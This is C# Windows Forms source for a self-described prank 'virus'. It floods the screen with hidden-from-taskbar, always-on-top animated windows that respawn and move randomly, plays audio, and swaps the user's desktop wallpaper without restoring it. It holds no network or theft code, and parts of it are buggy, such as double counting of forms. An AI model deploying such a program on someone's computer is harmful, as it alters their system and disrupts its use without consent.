using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Timer = System.Windows.Forms.Timer;

namespace Havoks_Virus
{
    public class PrankForm : Form
    {
        private PictureBox pictureBox = new PictureBox();
        private List<Image> gifFrames = new List<Image>(); // Stores each frame of the GIF
        private int currentFrame = 0; // Tracks the current frame of the GIF
        private Timer moveTimer = new Timer(); // Timer for controlling movement speed
        private static int formCount = 0; // Keep track of the number of forms
        private const int maxForms = 10;  // Maximum number of forms allowed ..... Count starts from zero
        private List<Image> loadedImages = new List<Image>(); // To store loaded images
        private static List<PrankForm> openForms = new List<PrankForm>(); // Track all open forms
        private Timer wallpaperTimer = new Timer(); // Timer for changing the wallpaper
        private string originalWallpaperPath; // To store the path of the original wallpaper
        private static Audio sharedAudio = new Audio(); // Audio system for the prank form
        private Random random = new Random(); // Random number generator
        private static bool IsWallpaperSet = false; // Track if wallpaper is set
        private static bool wallpaperSet = false; // Ensure wallpaper is only set once

        public PrankForm()
        {
            InitializeComponent();
            this.DoubleBuffered = true; // Reduce flickering effect

            this.Size = new Size(200, 200); // Set the size of the prank form
            LoadAndDisplayGif("Media/blade.gif"); // Synchronously load and display GIF

            //SetupMovementTimer(); // Configure movement for the prank form
            SetupTimer(); // Configure how often to update form properties

            SetInitialWallpaper(); // Set the initial wallpaper once

            originalWallpaperPath = GetOriginalWallpaperPath(); // Keep original wallpaper path for later restoration
            ExtractFramesFromGif("Media/blade.gif"); // Extract frames for any gif animations
            LoadContentAsync(); // Load heavy content asynchronously to keep UI responsive

            System.Console.WriteLine($"Form {formCount} created."); // Count the forms being spawned for testing

            openForms.Add(this); // Add this form to the tracking list
            formCount++; // Increment the global form count

            if (formCount <= maxForms)
            {
                if (openForms.Count == 1)
                {
                    CreateFormsForAllScreens(); // Create forms for all screens
                }

                Timer spawnTimer = new Timer { Interval = 8000 }; // Timer to spawn additional forms
                spawnTimer.Tick += (sender, e) => SpawnAdditionalForm();
                spawnTimer.Start();

                if (formCount == 1) // Only initialize once
                {
                    sharedAudio = new Audio();
                    sharedAudio.Start();
                }

                // Set the wallpaper if not already set
                if (!wallpaperSet)
                {
                    string wallpaperPath = Application.StartupPath + "\\Media\\wallpaper.jpg";
                    System.Console.WriteLine($"Setting wallpaper from: {wallpaperPath}");
                    WallpaperChanger.SetWallpaper(wallpaperPath, WallpaperChanger.Style.Stretched);
                    wallpaperSet = true; // Mark that the wallpaper has now been set

                    openForms.Add(this); // Add this form to the tracking list
                    formCount++; // Increment the global form count
                }
            }

            // Delayed or conditional actions (commented out for potential future use)
            // Task.Delay(7000).ContinueWith(t => StartJobSearch()); // Adjust delay as needed
            // StartJobSearchWithDelay(); // Delay the start of the job search
            // sharedAudio = new Audio(); // Initialize the background audio (if needed)
            // sharedAudio.Start(); // Start playing background audio (if needed)
        }

        private void InitializeComponent()
        {
            this.pictureBox.Dock = DockStyle.Fill;
            this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Controls.Add(pictureBox);

            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Size = new Size(200, 200);
            this.BackColor = Color.Black;
            this.TransparencyKey = Color.Black;
            this.ShowInTaskbar = false;
        }

        private void LoadAndDisplayGif(string gifPath)
        {
            // Load the GIF image from the specified path
            Image gifImg = Image.FromFile(gifPath);

            // Extract frames and assign the first frame to the PictureBox
            FrameDimension dimension = new FrameDimension(gifImg.FrameDimensionsList[0]);
            int frameCount = gifImg.GetFrameCount(dimension);
            for (int i = 0; i < frameCount; i++)
            {
                gifImg.SelectActiveFrame(dimension, i);
                gifFrames.Add((Image)gifImg.Clone());
            }

            if (gifFrames.Count > 0)
            {
                pictureBox.Image = gifFrames[0]; // Display the first frame
            }

            SetupTimer(); // Setup timer for GIF frame update
        }

        private string GetOriginalWallpaperPath()
        {
            return Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop")?.GetValue("WallPaper").ToString() ?? string.Empty;
        }

        private void SetInitialWallpaper()
        {
            // Ensure wallpaper is set only once across all instances
            if (!IsWallpaperSet)
            {
                ChangeWallpaper();
                IsWallpaperSet = true; // Prevent further wallpaper changes
            }
        }

        private void ChangeWallpaper()
        {
            // Method to actually change the wallpaper
            string wallpaperPath = Application.StartupPath + "\\Media\\wallpaper.jpg";
            System.Console.WriteLine($"Setting wallpaper from: {wallpaperPath}");
            WallpaperChanger.SetWallpaper(wallpaperPath, WallpaperChanger.Style.Stretched);
        }

        private void ExtractFramesFromGif(string path)
        {
            Image gifImg = Image.FromFile(path);
            FrameDimension dimension = new FrameDimension(gifImg.FrameDimensionsList[0]);
            int frameCount = gifImg.GetFrameCount(dimension);
            for (int i = 0; i < frameCount; i++)
            {
                gifImg.SelectActiveFrame(dimension, i);
                gifFrames.Add((Image)gifImg.Clone());
            }
        }

        private void SetupTimer()
        {
            moveTimer.Interval = new Random().Next(15000, 35000); // Random movement speed for each form
            moveTimer.Tick += new EventHandler(OnTimerTick);
            moveTimer.Start();
        }

        private void OnTimerTick(object sender, EventArgs e)
        {
            if (gifFrames.Count > 0)
            {
                pictureBox.Image = gifFrames[currentFrame];
                currentFrame = (currentFrame + 1) % gifFrames.Count; // Iterate through frames
            }

            // Move the form to a new random location on the screen
            RepositionFormRandomly();
        }

        private async void LoadContentAsync()
        {
            // Assume LoadHeavyContent is a method that loads images, sounds, etc.
            await Task.Run(() => LoadHeavyContent()); // Load in the background

            // Update the UI after loading is complete
            // Make sure to marshal these calls back to the UI thread!
            this.Invoke(new Action(() =>
            {
                
                // Update your form with the loaded content
            }));
            await Task.Run(() => LoadHeavyContent());
        }

        private void LoadHeavyContent()
        {
            try
            {
                // Specify the directory of your heavy content
                string mediaPath = Application.StartupPath + "\\Media";

                // Get all jpg files in the directory
                string[] imageFiles = Directory.GetFiles(mediaPath, "*.jpg"); // Adjust the search pattern as needed

                foreach (var imagePath in imageFiles)
                {
                    // Load each image and add it to the list
                    Image img = Image.FromFile(imagePath);
                    loadedImages.Add(img);
                }

                // At this point, loadedImages contains all the images
                // You might want to use these images in your forms or some other logic
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., file not found, out of memory, etc.)
                System.Console.WriteLine("Error loading heavy content: " + ex.Message);
                // Consider logging the error or taking appropriate action
            }
        }

        private void CreateFormsForAllScreens()
        {
            foreach (Screen screen in Screen.AllScreens)
            {
                PrankForm prankForm = new PrankForm();

                // Set start position to Manual for custom location setting
                prankForm.StartPosition = FormStartPosition.Manual;

                // Set the size of the form (make sure it's 200x200 as intended)
                prankForm.Size = new Size(200, 200);

                // Calculate a random position within the current screen bounds
                int maxX = Math.Max(screen.Bounds.Width - prankForm.Width, 0);
                int maxY = Math.Max(screen.Bounds.Height - prankForm.Height, 0);
                int randomX = screen.Bounds.X + random.Next(maxX);
                int randomY = screen.Bounds.Y + random.Next(maxY);

                // Set the location of the form to the random position calculated
                prankForm.Location = new Point(randomX, randomY);

                // Show the form
                prankForm.Show();
            }
        }

        private System.ComponentModel.IContainer? components = null;

        // Ensure proper disposal of resources or any additional cleanup if necessary
        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Dispose managed resources
                components?.Dispose();
                moveTimer?.Dispose();
                wallpaperTimer?.Dispose();
                // Dispose any other resources created in your form
            }

            // Dispose unmanaged resources if any

            base.Dispose(disposing);
        }


        private void MonitorAndCloseForms()
        {
            // Logic to close forms if too many are open
            while (openForms.Count > maxForms)
            {
                // Close the oldest form
                var formToClose = openForms[0];
                openForms.RemoveAt(0);
                formToClose.Close(); // This calls Dispose on the form if properly implemented
            }
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            // Dispose sharedAudio only when the last form is closing
            if (formCount == 1 && sharedAudio != null)
            {
                sharedAudio.Dispose();
            }

            openForms.Remove(this);
            formCount--;

            base.OnFormClosed(e);
        }

        private async void SpawnAdditionalForm()
        {
            if (formCount < maxForms) // Check again to prevent race conditions
            {
                // Asynchronously wait without blocking the UI thread.
                await Task.Delay(500); // Adjust the delay as needed

                // After the delay, continue on the UI thread.
                PrankForm additionalForm = new PrankForm();
                additionalForm.Show();
            }
        }

        private void RepositionFormRandomly()
        {
            // Get screen dimensions
            int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
            int screenHeight = Screen.PrimaryScreen.WorkingArea.Height;

            // Calculate the maximum allowable coordinates
            int maxX = Math.Max(screenWidth - this.Width, 0);
            int maxY = Math.Max(screenHeight - this.Height, 0);

            // Set the form's location to a new random point within the screen bounds
            this.Location = new Point(random.Next(maxX), random.Next(maxY));
        }

        private Timer movementTimer = new Timer();

        private void SetupMovementTimer()
        {
            Random rng = new Random();
            int minInterval = 1000; // Minimum interval in milliseconds (2.5 seconds)
            int maxInterval = 8000; // Maximum interval in milliseconds (11 seconds)

            movementTimer.Interval = rng.Next(minInterval, maxInterval); // Set a random interval between the min and max
            movementTimer.Tick += (sender, e) => RepositionFormRandomly();
            movementTimer.Start();
        }
    }
}